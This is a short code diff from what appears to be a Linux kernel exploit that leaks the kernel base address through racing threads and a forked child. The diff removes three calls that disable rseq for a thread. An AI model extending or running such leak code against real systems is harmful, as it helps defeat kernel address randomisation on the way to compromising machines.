@@ -226,7 +226,6 @@ void slide_pselect_stack_copy(void) {
 }
 
 void *slide_consumer_thread(void *arg __attribute__((unused))) {
-  disable_rseq_for_thread();
   pin_to_core(CONSUMER_CORE);
 
   int seen = 0;
@@ -282,7 +281,6 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
 }
 
 void *slide_waiter_thread(void *arg __attribute__((unused))) {
-  disable_rseq_for_thread();
   int tid = (int)SYSCHK(syscall(SYS_gettid));
   atomic_store(&slide_waiter_tid, tid);
 
@@ -446,7 +444,6 @@ int slide_leak_kernel_base(void) {
     pid_t child = SYSCHK(fork());
     if (child == 0) {
       SYSCHK(close(fds[0]));
-      disable_rseq_for_thread();
       log_slide_child_context();
       uint64_t stext = slide_child_leak_stext();
       if (stext) {
